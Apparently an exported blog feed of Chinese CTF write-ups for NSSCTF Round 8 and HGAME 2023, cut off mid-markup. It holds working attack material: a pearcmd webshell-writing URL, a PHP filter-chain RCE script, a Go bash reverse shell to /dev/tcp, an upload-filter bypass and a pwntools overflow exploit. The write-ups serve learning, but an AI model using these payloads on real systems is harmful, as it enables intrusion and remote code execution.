class="variable">$file</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里可以看到禁用了许多函数，上面是个命令执行，<br>这里N_S.S 形式第一次见是在ctfshow web123</p><p>PHP变量名应该只有数字字母下划线,同时GET或POST方式传进去的变量名,会自动将空格+ . [转换为_<br>但是有一个特性可以绕过,使变量名出现.之类的<br>特殊字符[, GET或POST方式传参时,变量名中的[也会被替换为_,但其后的字符就不会被替换了<br>如 CTF[SHOW.COM=&gt;CTF_SHOW.COM<br>也就是传参的时候<br>n_s.s &gt; n[s.s</p><p><img src="/images/Round-8/image-20230216161717020.png" alt="image-20230216161717020"></p><p>FLAG 在环境变量里</p><h4 id="MyPage-不会"><a href="#MyPage-不会" class="headerlink" title="MyPage 不会"></a>MyPage 不会</h4><p>参考<br><code>https://blog.csdn.net/qq_61768489/article/details/129016075</code><br><code>http://v2ish1yan.top/2023/02/12/%E6%AF%94%E8%B5%9Bwp/NSSCTF%20Round8/</code><br><code>https://juejin.cn/post/7147638903191814180</code><br>首先还是文件包含可以etcpasswd正常，index。php不可以.伪协议php也不可以</p><p>pear工具里有一个命令叫:config-create,这个命令需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中。<br>我们可以构造url:<br>index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/<?=phpinfo()?>+/tmp/shell.php<br>复制代码<br>然后包含我们新建的这个文件就OK了。</p><p><img src="/images/Round-8/image-20230216165541573.png" alt="image-20230216165541573"></p><p>这里要注意编码问题，要在bp重发包就可以了</p><p><a href="http://43.142.108.3:28851/index.php?file=/tmp/shell.php">http://43.142.108.3:28851/index.php?file=/tmp/shell.php</a></p><p>二 读取源码 flag</p><p><a href="http://43.142.108.3:28025//index.php?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/cwd/index.php">http://43.142.108.3:28025//index.php?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/cwd/index.php</a></p><p><img src="/images/Round-8/image-20230216174510836.png" alt="image-20230216174510836"></p><p>三</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://43.142.108.3:28025/index.php?file=&quot;</span></span><br><span class="line">file_to_use = <span class="string">&quot;/etc/passwd&quot;</span></span><br><span class="line">command = <span class="string">&quot;id&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#&lt;?=`$_GET[0]`;;?&gt;</span></span><br><span class="line">base64_payload = <span class="string">&quot;PD89YCRfR0VUWzBdYDs7Pz4&quot;</span></span><br><span class="line"></span><br><span class="line">conversions = &#123;</span><br><span class="line">    <span class="string">&#x27;R&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;C&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;9&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;z&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;P&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;V&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Y&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;W&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># generate some garbage base64</span></span><br><span class="line">filters = <span class="string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span></span><br><span class="line">filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line"><span class="comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span></span><br><span class="line">filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> base64_payload[::-<span class="number">1</span>]:</span><br><span class="line">        filters += conversions[c] + <span class="string">&quot;|&quot;</span></span><br><span class="line">        <span class="comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-decode|&quot;</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line">        <span class="comment"># get rid of equal signs</span></span><br><span class="line">        filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line">filters += <span class="string">&quot;convert.base64-decode&quot;</span></span><br><span class="line"></span><br><span class="line">final_payload = <span class="string">f&quot;php://filter/<span class="subst">&#123;filters&#125;</span>/resource=<span class="subst">&#123;file_to_use&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">r = requests.get(url, params=&#123;</span><br><span class="line">    <span class="string">&quot;0&quot;</span>: command,</span><br><span class="line">    <span class="string">&quot;action&quot;</span>: <span class="string">&quot;include&quot;</span>,</span><br><span class="line">    <span class="string">&quot;file&quot;</span>: final_payload</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><h4 id="Upload-gogoggoUpload-gogoggo"><a href="#Upload-gogoggoUpload-gogoggo" class="headerlink" title="Upload_gogoggoUpload_gogoggo"></a>Upload_gogoggoUpload_gogoggo</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;os/exec&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">cmd := exec.Command(<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;bash -i &amp;&gt; /dev/tcp/ip/port 0&gt;&amp;1&quot;</span>)</span><br><span class="line">out, err := cmd.CombinedOutput()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;combined out:\n%s\n&quot;</span>, <span class="keyword">string</span>(out))</span><br><span class="line">log.Fatalf(<span class="string">&quot;cmd.Run() failed with %s\n&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Printf(<span class="string">&quot;combined out:\n%s\n&quot;</span>, <span class="keyword">string</span>(out))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>go run run.go</p><p>上传这个go文件</p><p>nc -lvnkp</p><p><img src="/images/Round-8/image-20230216184449491.png" alt="image-20230216184449491"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 伪协议 </tag>
            
            <tag> RCE </tag>
            
            <tag> GO </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023hgame部分wp</title>
      <link href="/2023/01/06/CTFS/2023hgame%E9%83%A8%E5%88%86wp/"/>
      <url>/2023/01/06/CTFS/2023hgame%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<h2 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h2><h3 id="Classic-Childhood-Game"><a href="#Classic-Childhood-Game" class="headerlink" title="Classic Childhood Game"></a>Classic Childhood Game</h3><p>简单js,我们右键源代码一下，翻一翻js文件直接搜hgame 没有，那肯定时编码或者加密了，找找可疑字符串，拿去解一下</p><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230106152018877.png" alt="image-20230106152018877"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">function mota() &#123;</span><br><span class="line">  var a = [&#x27;\x59\x55\x64\x6b\x61\x47\x4a\x58\x56\x6a\x64\x61\x62\x46\x5a\x31\x59\x6d\x35\x73\x53\x31\x6c\x59\x57\x6d\x68\x6a\x4d\x6b\x35\x35\x59\x56\x68\x43\x4d\x45\x70\x72\x57\x6a\x46\x69\x62\x54\x55\x31\x56\x46\x52\x43\x4d\x46\x6c\x56\x59\x7a\x42\x69\x56\x31\x59\x35&#x27;];</span><br></pre></td></tr></table></figure><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230106152036326.png" alt="image-20230106152036326"></p><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="Become-A-Member"><a href="#Become-A-Member" class="headerlink" title="Become A Member"></a>Become A Member</h4><p>典型header头请求，cookie那个还挺难想的emmmm</p><p>Referer: bunnybunnybunny.com<br>X-Forwarded-For: 127.0.0.1</p><p>Cookie: code=Vidar</p><p>{“username”:”luckytoday”,”password”:”happy123”}</p><figure class="highlight plaintext"><figcaption><span>/ HTTP/1.1 http</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Host: week-1.hgame.lwsec.cn:30417</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Cute-Bunny</span><br><span class="line">Referer: bunnybunnybunny.com</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Cookie: code=Vidar</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 47</span><br><span class="line"></span><br><span class="line">&#123;&quot;username&quot;:&quot;luckytoday&quot;,&quot;password&quot;:&quot;happy123&quot;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230106172621452.png" alt="image-20230106172621452"></p><h4 id="Guess-Who-I-Am"><a href="#Guess-Who-I-Am" class="headerlink" title="Guess Who I Am"></a>Guess Who I Am</h4><p>这题没有用hint，直接全选复制的那个页面，然后 脚本有点麻烦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">d = &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">ba1van4ba1van4</span></span><br><span class="line"><span class="string">21级 / 不会Re / 不会美工 / 活在梦里 / 喜欢做不会的事情 / ◼◻粉</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">yolandeyolande</span></span><br><span class="line"><span class="string">21级 / 非常菜的密码手 / 很懒的摸鱼爱好者，有点呆，想学点别的但是一直开摆</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">t0hkat0hka</span></span><br><span class="line"><span class="string">21级 / 日常自闭的Re手</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">h4kuy4h4kuy4</span></span><br><span class="line"><span class="string">21级 / 菜鸡pwn手 / 又菜又爱摆</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">.......</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s1 = s.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="string">&quot;&quot;</span> <span class="keyword">in</span> s1:<span class="comment"># 判断是否有空值在列表中</span></span><br><span class="line">    s1.remove(<span class="string">&quot;&quot;</span>)<span class="comment"># 如果有就直接通过remove删除</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s1)):</span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">        key = s1[i][<span class="number">0</span>:<span class="built_in">int</span>(<span class="built_in">len</span>(s1[i])/<span class="number">2</span>)]</span><br><span class="line">        <span class="comment"># print(key)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        value = s1[i]</span><br><span class="line">        <span class="comment"># print(value)</span></span><br><span class="line">        d[key]=value</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="comment">#键和值互换</span></span><br><span class="line">d = <span class="built_in">dict</span>(<span class="built_in">zip</span>(d.values(), d.keys()))</span><br><span class="line"><span class="comment">#21:mingzi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session = <span class="string">&quot;session=MTY3MzA3MjkwM3xEdi1CQkFFQ180SUFBUkFCRUFBQU9fLUNBQUlHYzNSeWFXNW5EQTBBQzJOb1lXeHNaVzVuWlVsa0EybHVkQVFDQUI0R2MzUnlhVzVuREFnQUJuTnZiSFpsWkFOcGJuUUVBZ0FJfKAl_lYBbx-VHq4BBl3686G2F3ThoYf7RvWQiatnCUqN&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">101</span>):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    url = <span class="string">&quot;http://week-1.hgame.lwsec.cn:31660/api/getQuestion&quot;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    headers=&#123;</span><br><span class="line">        <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;application/json, text/plain, */*&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;http://week-1.hgame.lwsec.cn:31660&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://week-1.hgame.lwsec.cn:31660/&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9,en;q=0.8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Cookie&#x27;</span>: session,</span><br><span class="line">        <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    text = requests.get(url,headers=headers)</span><br><span class="line">    ans = <span class="built_in">eval</span>(text.text)</span><br><span class="line">    <span class="comment">#&#123;&#x27;message&#x27;: &#x27;20级 / WEB / 菜的抠脚 / 想学GO&#x27;&#125;</span></span><br><span class="line">    answord = <span class="built_in">str</span>(ans[<span class="string">&#x27;message&#x27;</span>])</span><br><span class="line">    <span class="built_in">print</span>(answord)</span><br><span class="line">    <span class="keyword">if</span> answord <span class="keyword">in</span> d.keys():</span><br><span class="line">        <span class="built_in">print</span>(d[answord])</span><br><span class="line">        daan = d[answord]</span><br><span class="line">        data=&#123;</span><br><span class="line">        <span class="string">&#x27;id&#x27;</span>: daan,</span><br><span class="line">    &#125;</span><br><span class="line">        url_verifyAnswer = <span class="string">&quot;http://week-1.hgame.lwsec.cn:31660/api/verifyAnswer&quot;</span></span><br><span class="line">        text_verifyAnswer = requests.post(url = url_verifyAnswer,data=data,headers=headers)</span><br><span class="line">        <span class="comment"># print(text_verifyAnswer.text)</span></span><br><span class="line">        <span class="comment"># print(text_verifyAnswer.headers[&#x27;Set-Cookie&#x27;])</span></span><br><span class="line">        url_Score = <span class="string">&quot;http://week-1.hgame.lwsec.cn:31660/api/getScore&quot;</span></span><br><span class="line">        text_Score = requests.get(url = url_Score,data=data,headers=headers)</span><br><span class="line">        <span class="built_in">print</span>(text_Score.text)</span><br><span class="line">        <span class="comment"># print(text_verifyAnswer.headers[&#x27;Set-Cookie&#x27;])</span></span><br><span class="line">        sesson = re.findall(<span class="string">&quot;(.*?); Path=/&quot;</span>,text_verifyAnswer.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>])</span><br><span class="line">        session = sesson[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(session)</span><br><span class="line">        </span><br></pre></td></tr></table></figure><h4 id="Show-Me-Your-Beauty"><a href="#Show-Me-Your-Beauty" class="headerlink" title="Show Me Your Beauty"></a>Show Me Your Beauty</h4><p>简单文件上传，黑名单的php fuzz一下，大小写绕过就可以了，上传shell之后，蚁剑，flag在跟下</p><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230107160532176.png" alt="image-20230107160532176"></p><h3 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h3><h4 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h4><p>简单rsa n,e,d,都给了，使用大佬的工具所就行了</p><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230107161606240.png" alt="image-20230107161606240"></p><h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><h4 id="test-nc"><a href="#test-nc" class="headerlink" title="test_nc"></a>test_nc</h4><p>nc ip port 就可以执行命令了</p><h4 id="easy-overflow"><a href="#easy-overflow" class="headerlink" title="easy_overflow"></a>easy_overflow</h4><p>这个简单溢出题没见过，记录一下<br>点击main函数，然后F5查看伪源码,可以看到buf处存在溢出，但是有个close(1)，<br>close（1）关闭了标准输出<br>参考<code>https://blog.csdn.net/xirenwang/article/details/104139866</code> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>栈 10+8 backdoor 401176</p><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230207170004991.png" alt="image-20230207170004991"></p><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230207170036399.png" alt="image-20230207170036399"></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./vuln&quot;)</span></span><br><span class="line">p= remote(<span class="string">&quot;week-1.hgame.lwsec.cn&quot;</span>,<span class="string">&quot;32588&quot;</span>)</span><br><span class="line">backdoor = <span class="number">0x401176</span></span><br><span class="line">payload= <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>) + p64(backdoor)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level =<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p.recvuntil(&quot;Welcome!May I have your name?\n&quot;)</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;exec 1&gt;&amp;0&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#or</span></span><br><span class="line"><span class="comment">#p.sendline(&#x27;ls 1&gt;&amp;0&#x27;)</span></span><br><span class="line"><span class="comment">#p.sendline(&#x27;cat flag 1&gt;&amp;0&#x27;)</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230207170801337.png" alt="image-20230207170801337"></p><h2 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h2><h3 id="web-1"><a href="#web-1" class="headerlink" title="web"></a>web</h3><h4 id="Git-Leakage"><a href="#Git-Leakage" class="headerlink" title="Git Leakage"></a>Git Leakage</h4><figure class="highlight 